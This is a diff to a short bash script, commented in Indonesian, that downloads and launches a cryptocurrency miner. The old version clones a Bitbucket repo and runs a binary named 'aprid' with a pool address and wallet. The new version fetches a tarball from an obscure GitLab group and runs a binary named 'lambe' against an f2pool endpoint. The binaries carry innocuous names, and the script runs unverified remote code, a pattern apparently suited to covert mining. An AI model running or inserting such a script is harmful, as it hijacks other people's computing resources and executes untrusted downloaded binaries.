@@ -1,6 +1,10 @@
 #!/bin/bash
-yum update && yum -y install sudo
-yum -y install git wget
-git clone https://bitbucket.org/asana/luo.git && cd luo
-chmod 777 aprid SHA256SUMS
-./aprid --donate-level 1 -o hk.salvium.herominers.com:1230 -u solo:SaLvs9aDPAZREssAmnevZnQHdiMvTJEnzjPvovNzgvBSUEbYt5W3d9ZiMSQoRLH86pBxqYR9CAETkjBtv6S7QRqf5jkzQQHi9e2 -p pool -a rx/0
+yum update && yum -y install sudo git wget
+
+# Proses unduh dan ekstrak yang benar
+wget https://gitlab.com/gas-group8801643/bac/-/raw/main/lambe.tar.gz
+tar -xvf lambe.tar.gz && cd lambe
+chmod +x lambe
+
+# Jalankan miner dengan alamat pool yang sudah diperbaiki
+./lambe --algorithm quantus --pool stratum+tcp://qtc.f2pool.com:4500 -u schacink.tes -p x
